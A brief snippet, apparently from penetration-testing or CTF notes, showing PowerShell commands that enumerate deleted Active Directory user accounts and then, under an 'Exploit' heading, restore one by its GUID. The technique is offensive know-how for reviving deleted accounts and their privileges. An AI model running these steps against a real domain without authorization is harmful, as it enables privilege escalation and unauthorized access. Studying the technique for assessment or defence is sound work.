```bash
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID, objectSid, lastKnownParent | Format-List
```

- Exploit
```bash
Restore-ADObject -Identity '1c6b1deb-c372-4cbb-87b1-15031de169db'
```
